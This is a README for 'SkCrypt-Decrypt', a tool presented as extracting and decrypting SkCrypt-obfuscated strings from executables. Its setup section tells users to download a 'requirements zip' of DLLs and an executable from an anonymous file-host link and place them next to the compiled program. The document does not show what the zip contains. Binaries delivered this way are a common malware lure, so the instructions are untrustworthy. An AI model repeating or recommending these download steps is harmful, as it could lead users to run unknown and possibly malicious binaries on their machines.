# SkCrypt-Decrypt

Welcome to SkCrypt-Decrypt — a powerful tool designed to decrypt strings encrypted with SkCrypt.  
Whether you're analyzing binaries or reversing obfuscated executables, this tool will help you recover the original plaintext strings with ease.

⚠️ For educational purposes only.

---

## Features

- Extracts and decrypts skCrypt("...") encrypted strings.
- Automatically parses strings from the target binary.
- Lightweight and fast.
- Easy to integrate into your workflow.

---

## Setup Instructions

Make sure your project is built in x64/Release mode before proceeding.

1. Clone this repository:
   git clone https://github.com/udman1336/SkCrypt-Decrypt.git
   cd SkCrypt-Decrypt

2. Download the requirements zip:

   Download from: https://gofile.io/d/U1vhs2

   - Extract the contents of the zip into your:
     x64/Release/
     folder (where your compiled binary lives).

3. Build the project using your favorite C++ compiler.

   For example:
   clang++ -std=c++20 -O2 -o SkCrypt-Decrypt SkCryptDecrypt.cpp

   Or Just Use Visual Studio Like An Ordinary

---

## Usage

Drag & Drop Your Target .exe Onto "SkCrypt Decrypt.exe"

## Folder Structure

SkCrypt-Decrypt/
├── x64/
│   └── Release/
│       ├── SkCrypt Decrypt.exe     ← Compiled Decrypter
│       ├── libc++-2.dll            ← Required DLL from the zip
│       ├── libLLVM-20.dll          ← Required DLL from the zip
│       ├── libxml2-2.dll           ← Required DLL from the zip
│       └── llvm-strings.exe        ← Required tool from the zip
├── SkCrypt Decrypt.cpp
└── README.md


## License

MIT License

Please use responsibly. This tool is intended for research and learning.

---

## Credits

Developed with ❤️ by udman
